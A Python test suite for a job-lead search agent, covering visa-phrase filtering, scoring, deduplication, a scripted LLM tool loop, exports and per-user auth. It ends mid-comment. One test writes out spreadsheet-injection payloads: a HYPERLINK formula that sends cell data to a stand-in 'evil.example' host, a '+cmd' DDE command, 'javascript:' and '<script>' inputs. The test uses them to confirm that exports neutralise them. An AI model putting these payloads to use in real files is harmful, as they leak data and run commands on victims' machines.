import sys, os, io, json, datetime
HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.join(HERE, "..", "backend"))
os.environ["DB_PATH"] = "/tmp/test_leads.db"
if os.path.exists("/tmp/test_leads.db"): os.remove("/tmp/test_leads.db")
os.environ["RULES_LOCAL_PATH"] = "/tmp/test_rules.local.json"
if os.path.exists("/tmp/test_rules.local.json"): os.remove("/tmp/test_rules.local.json")
os.environ.pop("RULES_JSON", None)

# Test profile = committed example + fictional companies. Never depends on anyone's personal rules.json.
EX = json.load(open(os.path.join(HERE, "..", "backend", "rules.example.json")))
EX["companies"].update(strong=["acme health", "initech", "globex"], moderate=["soylent"],
                       risk=["umbrella bank"], excluded=["hooli"])
json.dump(EX, open("/tmp/test_rules.json", "w"))
os.environ["RULES_PATH"] = "/tmp/test_rules.json"

import agent_service, free_sources, rules_service
from scraper_service import normalize
today = datetime.date.today().isoformat(); old = "2026-09-01"
def J(t,c,l,d,desc="",remote=False,u=None):
    j = normalize(t,c,l,u or f"https://x/{c}/{t}".replace(" ","_"),d,"mock",desc); j["is_remote"]=remote; return j
FIX = [
 J("Manager, Technical Product Owner - Data & Analytics","Acme Health","Round Rock, TX",today,"healthcare data platform sql agile genai 10+ years"),
 J("Senior Product Manager","Umbrella Bank","Austin, TX",today,"payments"),
 J("Technical Program Manager","Initech","Remote",today,"Initech is unable to sponsor a work visa for this role",remote=True),
 J("Senior Product Manager, Analytics","Globex","Austin, TX",today,"ai llm saas stakeholder roadmap"),
 J("Product Manager","Initech","Seattle, WA",today,"payments"),
 J("Product Manager","Initech","Remote",old,"payments",remote=True),
 J("Product Manager, AI","Tinyco","Remote",today,"llm rag",remote=True),
 J("Software Engineer","Initech","Remote",today,"",remote=True),
]
agent_service.fetch_ats = lambda boards, companies=None, queries=None: [dict(j) for j in FIX[:4]]
agent_service.fetch_jobspy = lambda *a, **k: [dict(j) for j in FIX[3:]]
agent_service.fetch_remotive = lambda kws: []
_real_research = agent_service.AgentRun.research_company_h1b
agent_service.AgentRun.research_company_h1b = lambda self, company: {"company":company,"lca_rows":3,"suggested_signal":"Risk"}
resume = "Product manager data platform sql agile genai llm saas stakeholder roadmap analytics python"

r = agent_service.AgentRun(resume, min_fit=30).run()
print("SUMMARY:", r["summary"]); print("GATES:", r["stats"]["gates"])
print("LEADS:", [(l["company"], l["fit"], l["is_new"]) for l in r["leads"]])
assert {l["company"] for l in r["leads"]} == {"Acme Health","Globex"}, r["leads"]
r2 = agent_service.AgentRun(resume, min_fit=30).run()
assert r2["new_count"] == 0, "second run should report nothing new"

# system prompt is built from the profile, nothing hardcoded
sp = agent_service.AgentRun(resume)._system()
assert "Austin, TX" in sp and "sponsorship" in sp and "{" not in sp, sp

# scripted OpenAI-compatible LLM loop
script = iter([
 {"tool_calls":[{"id":"1","function":{"name":"search_jobs","arguments":json.dumps({"source":"ats"})}}]},
 {"tool_calls":[{"id":"2","function":{"name":"score_jobs","arguments":json.dumps({"ids":["j0","j3"]})}}]},
 {"tool_calls":[{"id":"3","function":{"name":"save_leads","arguments":json.dumps({"ids":["j0","j1","j3"]})}}]},
 {"tool_calls":[{"id":"4","function":{"name":"finish","arguments":json.dumps({"summary":"2 leads: Acme, Globex"})}}]},
])
class R:
    def __init__(s,m): s.m=m
    def json(s): return {"choices":[{"message":{"role":"assistant","content":None,**s.m}}]}
agent_service.requests.post = lambda *a, **k: R(next(script))
agent_service.PROVIDER = "openai"
r3 = agent_service.AgentRun(resume, user_id="u2").run()
print("LLM LOOP:", r3["summary"], [t["tool"] for t in r3["trace"]], len(r3["leads"]))
assert len(r3["leads"]) == 2 and r3["summary"].startswith("2 leads")
agent_service.PROVIDER = "none"

# scoring model (H1B 35 / Title 25 / Geo 15 / Industry 15 / Contact 10; Hot >= 65)
from fit_service import score_lead
rules = rules_service.load_rules()
def S(job, rl=None): rl = rl or rules; return score_lead(rules_service.apply_gate(dict(job), rl, 24), rl)
s1 = S(J("Senior Product Manager","Acme Health","Round Rock, TX",today,"data platform"))
print("SCORE strong local PM:", s1["score"], s1["score_parts"])
assert s1["score"] >= 65 and s1["hot_lead"]
s2 = S(J("Product Lead","Tinyco","Remote",today,"workflow tooling",remote=True))
print("SCORE unverified remote stretch:", s2["score"], s2["score_parts"])
assert s2["score"] < 65 and not s2["hot_lead"] and s2["score_parts"]["title"] == 5
s3 = S(J("Product Manager","Initech","Remote",today,"unable to sponsor",remote=True))
assert s3["score_parts"]["h1b"] == 0, "explicit no-sponsorship -> 0 H1B points"
s4 = S(J("Product Manager","Initech","Remote",today,"genai agentic workflows in a regulated compliance setting",remote=True))
assert s4["score_parts"]["industry"] == 15, "GenAI + regulated override"
assert S(J("Technical Program Manager","Initech","Austin, TX",today,"payments"))["score_parts"]["title"] == 15
assert all("score" in l and "hot_lead" in l for l in r["leads"])
assert [l["score"] for l in r["leads"]] == sorted([l["score"] for l in r["leads"]], reverse=True)

# visa.enabled=false: no visa/company gates, H1B factor gets full points
nv = json.loads(json.dumps(rules)); nv["visa"]["enabled"] = False
assert rules_service.apply_gate(J("Product Manager","Initech","Remote",today,"unable to sponsor",remote=True), nv, 24)["gate"] == "pass"
assert rules_service.apply_gate(J("Product Manager","Tinyco","Austin, TX",today), nv, 24)["gate"] == "pass"
assert S(J("Product Manager","Tinyco","Austin, TX",today), nv)["score_parts"]["h1b"] == 35
assert "no sponsorship needed" in agent_service.AgentRun(resume, rules=nv)._system()

# profile loading: RULES_JSON env (e.g. a CI secret) wins over files
os.environ["RULES_JSON"] = json.dumps(dict(EX, profile=dict(EX["profile"], name="from-env")))
assert rules_service.load_rules()["profile"]["name"] == "from-env"
del os.environ["RULES_JSON"]
assert rules_service.load_rules()["profile"]["name"] == "example"
print("PROFILE: visa toggle + RULES_JSON loading OK")

# recency window: weekly (168h) keeps a 5-day-old job, daily (24h) drops it
five_days = (datetime.date.today() - datetime.timedelta(days=5)).isoformat()
pm5 = J("Senior Product Manager","Globex","Austin, TX",five_days,"saas")
assert rules_service.apply_gate(dict(pm5), rules, 168)["gate"] == "pass"
assert rules_service.apply_gate(dict(pm5), rules, 24)["gate"] == "stale_or_undated"
_fx = agent_service.fetch_ats
agent_service.fetch_ats = lambda boards, companies=None, queries=None: [dict(pm5, url="https://x/globex5d")]
wk = rules_service.load_rules(); wk["profile"]["recency_hours"] = 168
assert agent_service.AgentRun(resume, user_id="wk", rules=wk).search_jobs("ats")["gate_counts"] == {"pass": 1}
assert agent_service.AgentRun(resume, user_id="dy").search_jobs("ats")["gate_counts"] == {"stale_or_undated": 1}
agent_service.fetch_ats = _fx
print("RECENCY: 168h passes 5-day-old job, 24h rejects it")

# memory: a terminally-gated job's description is dropped from the pool (never re-read again);
# a job whose gate can still change (pass / company_unverified / staffing_c2c_only) keeps it
off_title = J("Warehouse Associate","Globex","Austin, TX",today,"long JD text here")
passer = J("Senior Product Manager","Globex","Austin, TX",today,"saas", u="https://x/pass1")
unverified = J("Senior Product Manager","Mystery Startup","Austin, TX",today,"saas", u="https://x/unver1")
agent_service.fetch_ats = lambda boards, companies=None, queries=None: [off_title, passer, unverified]
mem_run = agent_service.AgentRun(resume, user_id="mem"); mem_run.search_jobs("ats")
by_title = {j["title"]: j for j in mem_run.pool.values()}
assert by_title["Warehouse Associate"]["gate"] == "title" and by_title["Warehouse Associate"]["description"] == ""
assert by_title["Senior Product Manager"] is not None  # the Globex "pass" copy
for j in mem_run.pool.values():
    if j["gate"] in ("pass", "company_unverified"):
        assert j["description"], f"description dropped for re-gateable gate {j['gate']}"
agent_service.fetch_ats = _fx
print("MEMORY: terminally-gated jobs drop description, re-gateable ones keep it")

# staffing-firm rule: FT fails unless the posting confirms sponsorship; C2C passes
apex = J("Product Manager - II","Apex Systems","Austin, TX",today,"data platform roadmap")
assert rules_service.apply_gate(dict(apex), rules, 24, "ft")["gate"] == "staffing_c2c_only"
assert rules_service.apply_gate(dict(apex), rules, 168, "c2c")["gate"] == "pass"
apex_ok = dict(apex, description="H1B sponsorship available for this role")
rules_ok = json.loads(json.dumps(rules)); rules_ok["companies"]["moderate"].append("apex systems")
assert rules_service.apply_gate(apex_ok, rules_ok, 24, "ft")["gate"] == "pass"
a = agent_service.AgentRun(resume, user_id="apex"); a.pool["j0"] = rules_service.apply_gate(dict(apex), rules, 24)
a.set_company_signal("Apex Systems", "Moderate")  # research override must not bypass the staffing rule
assert a.pool["j0"]["gate"] == "staffing_c2c_only"
print("STAFFING: Apex fails FT, passes C2C")

# persisted H1B research: 2nd run makes no research call for the same company
os.remove("/tmp/test_rules.local.json")
agent_service.AgentRun.research_company_h1b = _real_research
calls = []
class H:  # fake h1bdata.info page: 2 LCA rows, no PM titles -> Risk
    text = "<table><tr><th>h</th></tr>" + "<tr><td>Newco</td><td>DATA ANALYST</td><td>x</td><td>2025</td></tr>" * 2 + "</table>"
    def raise_for_status(s): pass
class HErr:  # rate-limit / error page: must NOT be cached as "0 filings"
    text = "<html>Too many requests</html>"
    def raise_for_status(s): pass
def fake_get(*a, **k):
    assert k["params"]["year"] != "all years", "all-years query returns no table for big employers"
    calls.append(k.get("params", {}).get("em"))
    return HErr() if k.get("params", {}).get("em") == "Flaky Inc" else H()
_get = agent_service.requests.get; agent_service.requests.get = fake_get
newco = J("Senior Product Manager","Newco Labs","Austin, TX",today,"saas",u="https://x/newco")
agent_service.fetch_ats = lambda boards, companies=None, queries=None: [dict(newco)]
agent_service.fetch_jobspy = lambda *a, **k: []
agent_service.AgentRun(resume, user_id="p1").run()
assert calls == ["Newco Labs", "Newco Labs"], calls  # last full year + current year
saved = json.load(open("/tmp/test_rules.local.json"))["company_signals"]
assert saved["newco labs"]["signal"] == "Risk", saved
assert rules_service.company_signal("Newco Labs", rules_service.load_rules()) == "Risk"
r5 = agent_service.AgentRun(resume, user_id="p2").run()
assert calls == ["Newco Labs", "Newco Labs"], f"second run re-researched: {calls}"
assert r5["stats"]["gates"] == {"company_risk": 1}
# Unverified result is cached too (no re-lookup), and manual tiers are never overridden by research
rules_service.save_company_signal("Mystery Co", "Unverified", "no filings")
rules_service.save_company_signal("Umbrella Bank", "Strong", "h1bdata")
lr = rules_service.load_rules()
assert agent_service.AgentRun(rules=lr).research_company_h1b("Mystery Co")["cached"] and calls == ["Newco Labs", "Newco Labs"]
# stale cache entries are re-checked (Unverified after 7 days)
lr["researched"]["mystery co"]["date"] = (datetime.date.today() - datetime.timedelta(days=8)).isoformat()
assert not agent_service.AgentRun(rules=lr).research_company_h1b("Mystery Co").get("cached") and calls[-1] == "Mystery Co"
assert rules_service.company_signal("Umbrella Bank", lr) == "Risk"
fl = agent_service.AgentRun(rules=lr).research_company_h1b("Flaky Inc")
assert fl.get("error") and "flaky inc" not in json.load(open("/tmp/test_rules.local.json"))["company_signals"]
agent_service.requests.get = _get
print("RESEARCH CACHE: second run made 0 research calls")

# Workday fetcher (mocked HTTP): relative dates, detail enrichment, expired-deadline skip
wd = free_sources._workday_days_ago
assert (wd("Posted Today"), wd("Posted Yesterday"), wd("Posted 3 Days Ago"), wd("Posted 30+ Days Ago"), wd("")) == (0, 1, 3, 31, None)
class WR:
    status_code = 200
    def __init__(s, d): s.d = d
    def json(s): return s.d
    def raise_for_status(s): pass
LIST = {"jobPostings": [
  {"title": "Senior Product Manager, AI", "externalPath": "/job/a", "locationsText": "2 Locations", "postedOn": "Posted Today"},
  {"title": "Program Manager", "externalPath": "/job/b", "locationsText": "USA - Remote", "postedOn": "Posted 2 Days Ago"},
  {"title": "Sales Engineer", "externalPath": "/job/c", "locationsText": "TX", "postedOn": "Posted Today"},
  {"title": "Product Owner", "externalPath": "/job/d", "locationsText": "TX", "postedOn": "Posted 30+ Days Ago"}]}
DET = {"/job/a": {"startDate": today, "location": "Seattle, Washington, United States", "additionalLocations": ["Round Rock, Texas, United States"],
                  "jobDescription": "<p>GenAI saas</p>", "remoteType": "Hybrid"},
       "/job/b": {"startDate": today, "endDate": "2020-01-01", "location": "Remote"}}
_rq = free_sources.requests.request
free_sources.requests.request = lambda m, url, **k: WR(LIST if m == "POST" else {"jobPostingInfo": DET[url[url.index("/job/"):]]})
wjobs = {j["title"]: j for j in free_sources.fetch_company_board("acme health", "workday", "acme.wd1/Careers")}
free_sources.requests.request = _rq
assert set(wjobs) == {"Senior Product Manager, AI", "Product Owner"}, wjobs.keys()  # sales filtered, expired /job/b skipped
wa = wjobs["Senior Product Manager, AI"]
assert wa["posted"] == today and "Round Rock" in wa["location"] and "GenAI" in wa["description"]
assert wa["url"] == "https://acme.wd1.myworkdayjobs.com/Careers/job/a" and wa["source"] == "ATS/Workday"
assert rules_service.apply_gate(dict(wa), rules, 24)["gate"] == "pass"
assert rules_service.apply_gate(dict(wjobs["Product Owner"]), rules, 168)["gate"] == "stale_or_undated"
print("WORKDAY: dates, detail enrichment, deadline skip OK")

# geography: a specific out-of-area US city must fail even with "United States" in it
for loc, ok in [("Irvine, California, United States", False), ("Boston, MA, USA", False), ("United States", True),
                ("USA", True), ("Round Rock, Texas, United States", True), ("Austin, TX, USA", True),
                ("US-Remote", True), ("Sunnyvale, CA; Austin, TX", True)]:
    assert rules_service.geo_ok(loc, rules) == ok, loc

# JobSpy searches the profile's locations + remote, never hardcoded places
seen_locs = []
class DF:
    def fillna(s, v): return s
    def to_dict(s, how): return []
import types
sys.modules["jobspy"] = types.SimpleNamespace(scrape_jobs=lambda **k: seen_locs.append((k["location"], k["is_remote"])) or DF())
free_sources.fetch_jobspy(["Product Manager"], "", 24, sites=["indeed"], locations=["Austin, TX", "Denver, CO"])
assert seen_locs == [("Austin, TX", False), ("Denver, CO", False), ("United States", True)], seen_locs
del sys.modules["jobspy"]

# LinkedIn (rate-limit-prone) is queried only for an explicit location + remote US, not every
# profile location; the other sites still get the full fan-out
seen_sites = []
sys.modules["jobspy"] = types.SimpleNamespace(
    scrape_jobs=lambda **k: seen_sites.append((k["location"], tuple(k["site_name"]))) or DF())
free_sources.fetch_jobspy(["Product Manager"], "", 24, sites=["indeed", "linkedin"],
                          locations=["Austin, TX", "Denver, CO"])
assert seen_sites == [
    ("Austin, TX", ("indeed",)), ("Denver, CO", ("indeed",)), ("United States", ("indeed", "linkedin")),
], seen_sites
del sys.modules["jobspy"]
print("JOBSPY: LinkedIn location-limited to cut 429s OK")

# a hung JobSpy call is abandoned, not allowed to freeze the run
import time as _t
assert free_sources._with_timeout(lambda x: x * 2, 1, x=21) == 42
_t0 = _t.time()
try:
    free_sources._with_timeout(lambda: _t.sleep(30), 1); raise AssertionError("no timeout")
except TimeoutError:
    assert _t.time() - _t0 < 3
print("JOBSPY: profile locations + timeout guard OK")

# Sheets append maps to the tab's own header, never FIELDS order
from export_service import sheet_rows
HDR = ["Rank","Role","Vendor","Notes","Location","Posted","Job Link","Status"]
row = sheet_rows([dict(apex, posting_visa="Unknown")], HDR)[0]
assert row[1] == "Product Manager - II" and row[2] == "Apex Systems" and row[4] == "Austin, TX"
assert row[6] == apex["url"] and row[7] == "Not Applied" and row[0] == "" and row[3] == "" and row[5] == today
FT_HDR = ["Applied","Date Pulled","Role","Company","Location","H1B Signal","Source","Job Link","Contact","Score","Hot Lead"]
row = sheet_rows([dict(r["leads"][0])], FT_HDR)[0]
assert row[2] and row[3] == r["leads"][0]["company"] and row[7] == r["leads"][0]["url"] and row[9] == r["leads"][0]["score"]
print("SHEETS: rows aligned to existing tab headers")

# small-model robustness: stringly-typed args are coerced; stopping without saving falls back to the plan
agent_service.fetch_ats = lambda boards, companies=None, queries=None: [dict(j) for j in FIX[:4]]
agent_service.fetch_jobspy = lambda *a, **k: []
ag = agent_service.AgentRun(resume, user_id="u_small")
res = ag.search_jobs("ats", keywords="['job title 1', 'job title 2']", hours="24", remote="true")
assert res["gate_counts"].get("pass") == 2, res
script = iter([
 {"tool_calls":[{"id":"1","function":{"name":"search_jobs","arguments":json.dumps({"source":"ats","hours":"24"})}}]},
 {"content":'{"name": "search_jobs", "parameters": {"source": "ats"}}'}])
agent_service.requests.post = lambda *a, **k: R(next(script))
agent_service.PROVIDER = "openai"
r6 = agent_service.AgentRun(resume, user_id="u_small2").run()
agent_service.PROVIDER = "none"
assert len(r6["leads"]) == 2 and r6["summary"].startswith("LLM stopped early"), r6["summary"]
print("SMALL-LLM: arg coercion + fallback OK")

# H1B posting-language filter: phrasings, line breaks, inclusive lists, negated clearance
VISA_CASES = [
 ("We are unable to\n sponsor visas for this role", "No"),
 ("We do not offer visa sponsorship for this position", "No"),
 ("We do not currently offer relocation or visa sponsorship.", "No"),
 ("Candidates are not eligible for visa sponsorship", "No"),
 ("Sponsorship will not be provided", "No"),
 ("No visa sponsorship available", "No"),
 ("Applicants who now or in the future require sponsorship will not be considered", "No"),
 ("Must be authorized to work in the US without sponsorship", "No"),
 ("Initech is unable to sponsor a work visa", "No"),
 ("Must be a US citizen", "No"),
 ("Active security clearance required", "No"),
 ("US citizens, green card holders and H1B visa holders are encouraged to apply", "Yes"),
 ("No security clearance required. Hybrid.", "Unknown"),
 ("H1B sponsorship available", "Yes"),
 ("We welcome H-1B transfers", "Yes"),
 ("Great benefits, hybrid", "Unknown"),
 ("We do not discriminate based on citizenship status", "Unknown"),
 ("We consider all qualified applicants regardless of visa status", "Unknown"),
 ("This position is not eligible for new H-1B visa sponsorship by Initech.", "No"),
 ("Experience with FedRAMP environments is a plus", "Unknown"),
 ("Candidates must be a U.S. person under export control rules", "No"),
 # refuses NEW sponsorship but accepts change-of-employer petitions (H-1B transfer)
 ("This position is not eligible for new H-1B visa sponsorship by Initech. Candidates who currently hold valid work "
  "authorization may be considered for a change of employer petition.", "Transfer"),
 ("We cannot sponsor new visas; H-1B transfers are welcome.", "Transfer"),
 ("We do not sponsor visas and H-1B transfer is not available.", "No"),
 ("Active security clearance required. H-1B transfers considered.", "No"),
 ("Acme is unable to&nbsp;sponsor work visas for this role", "No"),
 ("Acme will not consider applicants for employment immigration sponsorship or support for this position. This means Acme "
  "will not support any CPT, OPT, or STEM OPT plans, F-1, H-1B, H-1B cap registration, O-1, E-3, TN status.", "No"),
 ("Sponsorship for this position is not available.", "No"),
 ("We do not offer relocation; visa sponsorship is available.", "Yes"),
 ("We do not discriminate on the basis of race, religion or visa status.", "Unknown"),
]
assert "unable to sponsor" in free_sources._strip_html("&lt;p&gt;We are unable to&amp;nbsp;sponsor visas&lt;/p&gt;")
bad = [(t, e, rules_service.posting_visa_flag(t, rules)) for t, e in VISA_CASES if rules_service.posting_visa_flag(t, rules) != e]
assert not bad, bad
# a disclaimer at the END of a long JD must still block (descriptions used to be cut at 800 chars)
long_jd = "Great role building data products. " * 100 + "Unfortunately we are unable to sponsor visas."
lj = J("Senior Product Manager","Acme Health","Austin, TX",today,long_jd)
assert len(lj["description"]) > 3000 and rules_service.apply_gate(lj, rules, 24)["gate"] == "posting_no_sponsorship"
# aggregator dates in the future are rejected
future = (datetime.date.today() + datetime.timedelta(days=9)).isoformat()
assert rules_service.apply_gate(J("Senior Product Manager","Acme Health","Austin, TX",future), rules, 168)["gate"] == "future_date"
# Transfer postings: kept for profiles that already hold an H-1B (mode h1b_transfer), blocked otherwise
tr = J("Senior Product Manager","Acme Health","Austin, TX",today,"No new H-1B sponsorship; change of employer petitions considered.")
assert rules_service.apply_gate(dict(tr), rules, 24)["gate"] == "posting_no_sponsorship"   # example profile: new_sponsorship
tm = json.loads(json.dumps(rules)); tm["visa"]["mode"] = "h1b_transfer"
gt = rules_service.apply_gate(dict(tr), tm, 24)
assert gt["gate"] == "pass" and gt["posting_visa"] == "Transfer" and score_lead(gt, tm)["score_parts"]["h1b"] == 35
assert rules_service.apply_gate(dict(tr, company="Brandnew Widgets"), tm, 24)["gate"] == "company_unverified"  # tier still applies
print(f"H1B FILTER: {len(VISA_CASES)} phrasings, transfer mode, long-JD disclaimer, future dates OK")

# cross-site dedupe: same job from 3 boards -> 1 lead; a no-sponsorship line on any copy blocks it
DUPS = [J("Senior Product Manager","Globex","Austin, TX",today,"saas roadmap",u="https://globex.example/careers/1"),
        J("Senior Product Manager","Globex Inc.","Austin, TX, USA",today,"saas",u="https://indeed.example/1"),
        J("Senior Product Manager","Globex Corporation","Austin, Texas, United States",today,"",u="https://glassdoor.example/1"),
        J("Product Manager","Initech","Austin, TX",today,"payments",u="https://initech.example/9"),
        J("Product Manager","Initech LLC","Austin, TX",today,"payments. We do not offer visa sponsorship.",u="https://linkedin.example/9")]
agent_service.fetch_ats = lambda boards, companies=None, queries=None: [dict(j) for j in DUPS[:1] + DUPS[3:4]]
agent_service.fetch_jobspy = lambda *a, **k: [dict(j) for j in DUPS[1:3] + DUPS[4:]]
rd = agent_service.AgentRun(resume, user_id="dedupe").run()
assert [l["url"] for l in rd["leads"]] == ["https://globex.example/careers/1"], [l["url"] for l in rd["leads"]]
assert rd["stats"]["duplicates_merged"] == 3, rd["stats"]
# remote role listed under different hub cities on each board -> one lead; same title on-site in 2 cities stays 2
HUBS = [J("Product Manager, Platform","Initech","Remote - Texas, USA",today,"saas",remote=True,u="https://initech.example/r1"),
        J("Product Manager, Platform","Initech Systems","Austin, TX, USA",today,"saas",remote=True,u="https://glassdoor.example/r1"),
        J("Product Manager, Platform","Initech","Round Rock, TX, USA",today,"saas",remote=True,u="https://linkedin.example/r1"),
        J("Senior Product Manager","Acme Health","Austin, TX",today,"data",u="https://acme.example/a"),
        J("Senior Product Manager","Acme Health","Round Rock, TX",today,"data",u="https://acme.example/b")]
agent_service.fetch_ats = lambda boards, companies=None, queries=None: [dict(j) for j in HUBS]
agent_service.fetch_jobspy = lambda *a, **k: []
rh = agent_service.AgentRun(resume, user_id="hubs").run()
assert sorted(l["url"] for l in rh["leads"]) == ["https://acme.example/a", "https://acme.example/b", "https://initech.example/r1"], [l["url"] for l in rh["leads"]]
print("DEDUPE: 5 postings -> 1 lead; disclaimer on a duplicate copy still blocks; remote multi-hub merged")

# staffing jobs are routed to the contract track by the plan (not silently dropped)
agent_service.fetch_ats = lambda boards, companies=None, queries=None: [dict(apex, url="https://x/apex-route"), dict(FIX[0], url="https://x/acme-route")]
agent_service.fetch_jobspy = lambda *a, **k: []
rc = agent_service.AgentRun(resume, user_id="route").run()
tracks = {l["company"]: l["track"] for l in rc["leads"]}
assert tracks == {"Apex Systems": "c2c", "Acme Health": "ft"}, tracks
assert rc["stats"]["tracks"] == {"ft": 1, "c2c": 1} and "contract" in rc["summary"]
print("C2C ROUTING: staffing job saved on the contract track")

# research order: most promising unverified companies first (not alphabetical), limit counts real lookups only
agent_service.fetch_ats = lambda boards, companies=None, queries=None: [
    J("Software Engineer","Aardvark Co","Austin, TX",today,u="https://x/aa"),            # not a title match: never researched
    J("Senior Product Manager","Zeta Payments","Austin, TX",today,"fintech payments",u="https://x/zz"),
    J("Product Lead","Beta Widgets","Remote",today,remote=True,u="https://x/bb")]
looked = []
agent_service.AgentRun.research_company_h1b = lambda self, company: looked.append(company) or {"company": company, "suggested_signal": "Unverified"}
agent_service.AgentRun(resume, user_id="order").run()
assert looked == ["Zeta Payments", "Beta Widgets"], looked
agent_service.AgentRun.research_company_h1b = _real_research
print("RESEARCH ORDER: highest-potential company researched first")

# formula injection: scraped '=...' text stays text in CSV/XLSX; non-http links are dropped
evil = dict(FIX[0], title='=HYPERLINK("http://evil.example?"&A1,"x")', company="+cmd|' /C calc'!A0", url="javascript:alert(1)")
from export_service import to_csv as _to_csv, to_xlsx as _to_xlsx, _rows
row = _rows([evil])[0]
assert row["title"].startswith("'=") and row["company"].startswith("'+") and row["url"] == ""
from openpyxl import load_workbook
wb = load_workbook(io.BytesIO(_to_xlsx([evil])))
assert wb.active["B2"].data_type == "s" and wb.active["B2"].value.startswith("'=")
assert "'=HYPERLINK" in _to_csv([evil])
assert sheet_rows([evil], ["Role"])[0][0].startswith("=")  # Sheets gets RAW (never parsed), so no prefix
print("EXPORTS: formula injection neutralized")

# exports + API
from export_service import to_csv, to_xlsx
hdr = to_csv(r["leads"]).splitlines()[0]
assert "company_h1b" in hdr and "score" in hdr and "hot_lead" in hdr and "fit" in hdr
open("/tmp/l.xlsx","wb").write(to_xlsx(r["leads"]))
from fastapi.testclient import TestClient
import main, store, auth as auth_mod
c = TestClient(main.app)

# ── per-user passcode auth (POST /auth/login issues the session token every user-scoped endpoint now
# requires; user_id is derived from that token, never from a client-supplied field -- see main.py) ──
store.create_user("api", "correct-passcode")
store.create_user("api7", "another-passcode-2")
store.create_user("bg", "bg-passcode-1")
store.create_user("flt", "flt-passcode-1")
assert c.post("/auth/login", json={"user_id": "api", "passcode": "wrong"}).status_code == 401       # wrong passcode
assert c.post("/auth/login", json={"user_id": "nobody", "passcode": "whatever1"}).status_code == 401  # unknown user
lr = c.post("/auth/login", json={"user_id": "api", "passcode": "correct-passcode"})
assert lr.status_code == 200 and lr.json()["user_id"] == "api" and lr.json()["token"]
TOK_API = lr.json()["token"]
AUTH = {"X-Session-Token": TOK_API}
TOK_API7 = c.post("/auth/login", json={"user_id": "api7", "passcode": "another-passcode-2"}).json()["token"]
AUTH7 = {"X-Session-Token": TOK_API7}
TOK_BG = c.post("/auth/login", json={"user_id": "bg", "passcode": "bg-passcode-1"}).json()["token"]
AUTH_BG = {"X-Session-Token": TOK_BG}
TOK_FLT = c.post("/auth/login", json={"user_id": "flt", "passcode": "flt-passcode-1"}).json()["token"]
AUTH_FLT = {"X-Session-Token": TOK_FLT}
assert auth_mod.verify_session_token(TOK_API) == "api"
assert auth_mod.verify_session_token("garbage.notasig") is None          # tampered/malformed token rejected
assert auth_mod.verify_session_token(TOK_API + "x") is None              # altered signature rejected
assert c.get("/leads").status_code == 401                                # no session token at all
assert c.get("/leads", headers={"X-Session-Token": "garbage.notasig"}).status_code == 401  # bad session token
print("AUTH: correct/incorrect passcode, session token issue/verify/tamper OK")

print("/agent/run", c.post("/agent/run", json={"resume_text":resume}, headers=AUTH).status_code)
assert c.post("/agent/run", json={"resume_text":resume,"hours":168}, headers=AUTH7).status_code == 200
print("/leads json", c.get("/leads", headers=AUTH).json()["count"])
print("/leads csv", c.get("/leads?format=csv", headers=AUTH).headers["content-type"])
print("/leads xlsx", c.get("/leads?format=xlsx", headers=AUTH).status_code)
print("/export/sheets (no creds)", c.post("/export/sheets", json={"sheet_id":"abc"}, headers=AUTH).json())
print("/search", c.post("/search", json={"sources":["remotive"]}).status_code)

# ── per-user leads isolation: two different users never see each other's saved leads ──
store.save_leads([{"url": "https://x/only-api-sees-this", "title": "Only Api", "company": "Acme"}], "ft", "api")
store.save_leads([{"url": "https://x/only-api7-sees-this", "title": "Only Api7", "company": "Acme"}], "ft", "api7")
leads_api  = {l["url"] for l in c.get("/leads", headers=AUTH).json()["leads"]}
leads_api7 = {l["url"] for l in c.get("/leads", headers=AUTH7).json()["leads"]}
assert "https://x/only-api-sees-this" in leads_api and "https://x/only-api7-sees-this" not in leads_api
assert "https://x/only-api7-sees-this" in leads_api7 and "https://x/only-api-sees-this" not in leads_api7
print("ISOLATION: /leads scoped to the session's own user_id, not a client-supplied one OK")

# ── per-user profile isolation: a saved profile is used for that user only; others keep file defaults ──
custom = json.loads(json.dumps(EX))
custom["profile"]["titles"] = ["Data Engineer"]
store.save_profile("api", custom)
assert rules_service.load_rules(user_id="api")["profile"]["titles"] == ["Data Engineer"]
assert rules_service.load_rules(user_id="api7")["profile"]["titles"] != ["Data Engineer"]   # no profile row -> file default
assert rules_service.load_rules()["profile"]["titles"] != ["Data Engineer"]                 # no user_id -> unaffected
pf_api  = c.get("/profile/filters", headers=AUTH).json()
pf_api7 = c.get("/profile/filters", headers=AUTH7).json()
assert pf_api["titles"] == ["Data Engineer"] and pf_api7["titles"] != ["Data Engineer"]
print("PROFILE: per-user saved profile isolated from other users and from the file default OK")

# ── security controls ──
# input validation
assert c.post("/agent/run", json={"hours": 99999}, headers=AUTH).status_code == 422
assert c.post("/search", json={"sources": ["evil"]}).status_code == 422
assert c.post("/feedback", json={"url": "u", "signal": "<script>"}).status_code == 422
assert c.get("/leads?format=exe", headers=AUTH).status_code == 400
assert c.post("/export/sheets", json={"sheet_id": "abc/../x"}, headers=AUTH).status_code == 422
# resume upload: size cap, PDF signature
assert c.post("/parse-resume", files={"file": ("r.pdf", b"x" * (5 * 1024 * 1024 + 10), "application/pdf")}).status_code == 413
assert c.post("/parse-resume", files={"file": ("r.pdf", b"<html>not a pdf</html>", "application/pdf")}).status_code == 400
# no exception text leaks to clients
_run = agent_service.AgentRun.run
agent_service.AgentRun.run = lambda self, goal="": (_ for _ in ()).throw(RuntimeError("secret-internal-detail"))
er = c.post("/agent/run", json={}, headers=AUTH)
assert er.status_code == 500 and "secret-internal-detail" not in er.text, er.text
agent_service.AgentRun.run = _run
assert not main._agent_lock.locked(), "lock must be released after a failed run"
agent_service.fetch_ats = lambda boards, companies=None, queries=None: [dict(j) for j in FIX[:4]]
# one agent run at a time
main._agent_lock.acquire()
assert c.post("/agent/run", json={}, headers=AUTH).status_code == 429 and c.post("/agent/start", json={}, headers=AUTH).status_code == 429
main._agent_lock.release()
# background job: start + poll
jid = c.post("/agent/start", json={"hours": 168}, headers=AUTH_BG).json()["job_id"]
for _ in range(100):
    st = c.get(f"/agent/jobs/{jid}", headers=AUTH_BG).json()
    if st["status"] != "running": break
    _t.sleep(0.05)
assert st["status"] == "done" and len(st["result"]["leads"]) == 2, st
assert all("description" not in l for l in st["result"]["leads"])
assert c.get(f"/agent/jobs/{jid}").status_code == 401                 # no session token at all
assert c.get(f"/agent/jobs/{jid}", headers=AUTH).status_code == 404   # a different user can't poll bg's job
assert c.get("/agent/jobs/nope", headers=AUTH_BG).status_code == 404
# auth: with API_TOKEN set, everything except / and /health needs the bearer token (on top of the
